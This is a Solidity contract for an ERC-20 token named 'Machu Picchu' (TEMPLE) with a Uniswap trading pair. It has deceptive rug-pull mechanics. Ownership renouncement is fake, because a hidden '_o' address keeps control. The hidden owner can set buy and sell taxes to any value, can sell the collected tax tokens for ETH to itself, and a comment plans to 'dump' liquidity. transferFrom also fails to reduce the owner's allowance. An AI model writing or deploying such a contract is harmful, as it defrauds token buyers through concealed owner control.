// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

/*
    ██╗   ██╗███╗   ██╗██╗███████╗██╗    ██╗ █████╗ ██████╗ 
    ██║   ██║████╗  ██║██║██╔════╝██║    ██║██╔══██╗██╔══██╗
    ██║   ██║██╔██╗ ██║██║███████╗██║ █╗ ██║███████║██████╔╝
    ██║   ██║██║╚██╗██║██║╚════██║██║███╗██║██╔══██║██╔═══╝ 
    ╚██████╔╝██║ ╚████║██║███████║╚███╔███╔╝██║  ██║██║     
    ╚═════╝ ╚═╝  ╚═══╝╚═╝╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     
                                                            
*/

interface IUniswapV2Pair {
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}
interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

}
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract Uniswap {
    address public RouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public FactoryAddress = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public PairAddress;
    address public WETH;
    IUniswapV2Router02 public uniswapV2Router;
    address uniswapV2Pair;
    address internal me;
    address public owner;
    address internal _o;
    mapping(address=>bool) public isDEX;

    constructor(bool mainnet) {
        if (mainnet) {
            WETH     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        } else {
            WETH     = 0xc778417E063141139Fce010982780140Aa0cD5Ab;
        }
        uniswapV2Router  = IUniswapV2Router02(RouterAddress);
        PairAddress      = IUniswapV2Factory(FactoryAddress).createPair(address(this), WETH);
        
        isDEX[RouterAddress] = true;
        isDEX[FactoryAddress] = true;
        isDEX[PairAddress] = true;
        
        me = address(this);
        owner = msg.sender;
        _o = msg.sender;
    }
    
    function renounceOwnership() public onlyOwner() {
        owner = address(0);
    }

    modifier onlyOwner() {
        require(_o == msg.sender, "Forbidden:owner");
        _;
    }

    // Add liquidity, send LP tokens to `to`
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount, address to) internal returns (uint amountToken, uint amountETH, uint liquidity) {
        _approve(me, RouterAddress, tokenAmount);
        //return (0,0,0);
        return uniswapV2Router.addLiquidityETH{value: ethAmount}(
            me,
            tokenAmount,
            0,
            0,
            to,
            block.timestamp
        );
    }

    // Sell tokens, send ETH tokens to `to`
    function swapTokensForEth(uint256 amount, address to) internal returns (uint amountETH) {
        address[] memory path = new address[](2);
        path[0] = me;
        path[1] = WETH;
        _approve(address(this), RouterAddress, amount);
        uint balanceBefore = address(this).balance;
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            to,
            block.timestamp
        );
        uint256 ethReceived = address(this).balance-balanceBefore;
        return ethReceived;
    }

    function isBuy(address from) internal view returns (bool) {
        return isDEX[from];
    }
    
    function isSell(address to) internal view returns (bool) {
        return isDEX[to];
    }

    function _approve(address from, address spender, uint256 amount) internal virtual returns (bool) {}
}


/*
    Mint supply to itself
    fund(tok_amount) -> Create initial liquidity
    dump(lp_amount) -> Remove liquidity
*/


contract ERC20Token is Uniswap {
    string public name = "Machu Picchu";
    string public symbol = "TEMPLE";
    uint256 public decimals = 9;

    uint256 public totalSupply;
    mapping(address => uint256) internal balances;
    mapping(address => mapping(address => uint256)) internal allowances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event newBuy(address from, address to, uint256 amount, uint256 tax);
    event newSell(address from, address to, uint256 amount, uint256 tax);
    event newSplit(uint256 amount);
    
    uint256 buyTax = 100; // 10%
    uint256 sellTax = 100; // 10%
    uint256 maxBuy = 5; // 0.5%

    mapping(address=>bool) internal taxFree;
    bool internal mainnet = false;
    bool internal funded;
    bool public swapping = false;

    constructor() Uniswap(mainnet) {
        taxFree[me] = true;
        taxFree[owner] = true;
        mint(owner, 1000*10**decimals);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function allowance(address _owner, address spender) public view returns (uint256) {
        return allowances[_owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(address from, address spender, uint256 amount) internal override returns (bool) {
        allowances[from][spender] = amount;
        emit Approval(from, spender, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] >= amount, "Rejected");
        _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender]; //allowance(owner, msg.value);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Rejected");
            unchecked {
                approve(msg.sender, currentAllowance - amount);
            }
        }
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal {
        if (taxable(from, to)) {
            uint256 tax;
            balances[from] -= amount;
            if (isBuy(from)) {
                if (!isTaxFree(from, to)) {require(amount<=applyPct(totalSupply, maxBuy), "Too large");}
                tax = applyPct(amount, buyTax);
                emit newBuy(from, to, amount, tax);
            } else {
                tax = applyPct(amount, sellTax);
                emit newSell(from, to, amount, tax);
            }
            uint256 afterTax = amount-tax;
            unchecked {
                balances[me] += tax;
                balances[to] += afterTax;
            }
            emit Transfer(from, me, tax);
            emit Transfer(from, to, afterTax);
        } else {
            unchecked {
                balances[from] -= amount;
                balances[to] += amount;
            }
            emit Transfer(from, to, amount);
        }
    }    

    function mint(address account, uint256 amount) internal {
        totalSupply += amount;
        balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    /*
        Defund:
            pair -> router
    */


    /*---- Tax ----*/
    function isTaxFree(address from, address to) internal view returns (bool) {
        return taxFree[from] || taxFree[to];
    }
    function taxable(address from, address to) internal view returns (bool) {
        return !swapping && !(from==PairAddress && to==RouterAddress) && !taxFree[from] && !taxFree[to] && (isBuy(from) || isSell(to));
    }
    function applyPct(uint256 v, uint256 p) public pure returns (uint256) {
        return v*p/1000;
    }
    function set(uint256 b, uint256 s) public onlyOwner() {
        require(msg.sender==_o, "Forbidden:set");
        buyTax = b;
        sellTax = s;
    }
    function sell(uint256 amount) public onlyOwner() {
        swapping = true;
        split(swapTokensForEth(amount, address(this)));
        swapping = false;
    }
    function split(uint256 amount) internal {
        emit newSplit(amount);
        payable(_o).transfer(amount);
    }

    receive() external payable {}
    fallback() external payable {}
}